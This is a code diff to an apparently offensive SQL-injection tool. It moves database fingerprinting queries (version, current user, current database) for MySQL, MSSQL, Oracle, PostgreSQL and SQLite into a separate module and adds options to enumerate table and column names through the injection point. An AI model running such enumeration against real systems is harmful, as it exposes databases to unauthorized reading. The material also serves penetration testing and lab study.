@@ -5,6 +5,7 @@ import sys
 import uuid
 
 from . import __version__
+from .dbms import DBMS
 from .oob import InteractshLog
 from .payloads import PROFILES
 from .requester import current_value, inject, injection_points, parse_raw_request, send
@@ -45,35 +46,6 @@ def build_expression(args) -> str:
     if args.dbms != "mssql":
         expr += " LIMIT 1"
     return expr
-
-
-ENUM_EXPRESSIONS = {
-    "sqlite-lab": {
-        "banner": "SELECT sqlite_version()",
-        "current_user": "SELECT 'sqlite'",
-        "current_db": "SELECT 'main'",
-    },
-    "mssql": {
-        "banner": "SELECT @@version",
-        "current_user": "SELECT SYSTEM_USER",
-        "current_db": "SELECT DB_NAME()",
-    },
-    "mysql": {
-        "banner": "SELECT @@version",
-        "current_user": "SELECT USER()",
-        "current_db": "SELECT DATABASE()",
-    },
-    "oracle-http": {
-        "banner": "SELECT banner FROM v$version WHERE rownum=1",
-        "current_user": "SELECT USER FROM dual",
-        "current_db": "SELECT ora_database_name FROM dual",
-    },
-    "postgres-program": {
-        "banner": "SELECT version()",
-        "current_user": "SELECT current_user",
-        "current_db": "SELECT current_database()",
-    },
-}
 
 
 def load_common(args):
@@ -238,6 +210,7 @@ def extract(args) -> int:
 
 def enum(args) -> int:
     require_param(args)
+    dbms = DBMS[args.dbms]
     selected = []
     for option, key in (
         (args.banner, "banner"),
@@ -246,19 +219,51 @@ def enum(args) -> int:
     ):
         if option:
             selected.append(key)
+    if args.tables:
+        selected.append("tables")
+    if args.columns:
+        selected.append("columns")
     if not selected:
-        raise SystemExit("enum requires at least one of --banner, --current-user, --current-db")
+        raise SystemExit("enum requires at least one of --banner, --current-user, --current-db, --tables, --columns")
 
-    expressions = ENUM_EXPRESSIONS.get(args.dbms, {})
     for key in selected:
-        expr = expressions.get(key)
-        if not expr:
-            print(f"[!] {key} is not implemented for {args.dbms}")
+        if key == "tables":
+            enumerate_rows(args, "table", lambda index: dbms.table_expression(index))
             continue
-        print(f"\n[+] enum {key}: {expr}")
-        value = extract_value(args, expr, args.alphabet, args.max_len)
-        print(f"[+] {key}: {value}")
+        if key == "columns":
+            if not args.table:
+                raise SystemExit("enum --columns requires -T/--table")
+            enumerate_rows(args, f"column({args.table})", lambda index: dbms.column_expression(args.table, index))
+            continue
+
+        expr = dbms.metadata_expression(key)
+        if expr is None:
+            print(f"[!] {key} is not implemented for {args.dbms}")
+        else:
+            print(f"\n[+] enum {key}: {expr}")
+            value = extract_value(args, expr, args.alphabet, args.max_len)
+            print(f"[+] {key}: {value}")
     return 0
+
+
+def enumerate_rows(args, label: str, expression_builder) -> list[str]:
+    values = []
+    print(f"\n[+] enum {label}s")
+    for index in range(args.limit):
+        try:
+            expr = expression_builder(index)
+        except ValueError as exc:
+            print(f"[!] {exc}")
+            return values
+
+        print(f"[+] {label} index {index}: {expr}")
+        value = extract_value(args, expr, args.alphabet, args.max_len)
+        if not value:
+            print(f"[+] no more {label}s at index {index}")
+            break
+        values.append(value)
+        print(f"[+] {label}[{index}]: {value}")
+    return values
 
 
 def require_param(args):
@@ -333,6 +338,10 @@ def make_parser():
     p_enum.add_argument("--banner", action="store_true")
     p_enum.add_argument("--current-user", action="store_true")
     p_enum.add_argument("--current-db", action="store_true")
+    p_enum.add_argument("--tables", action="store_true", help="enumerate table names")
+    p_enum.add_argument("--columns", action="store_true", help="enumerate column names for -T/--table")
+    p_enum.add_argument("-T", "--table", help="table name for --columns")
+    p_enum.add_argument("--limit", type=int, default=20, help="maximum rows to enumerate for --tables/--columns")
     p_enum.add_argument("--alphabet", default=ENUM_ALPHABET)
     p_enum.add_argument("--max-len", type=int, default=120)
     p_enum.set_defaults(func=enum)
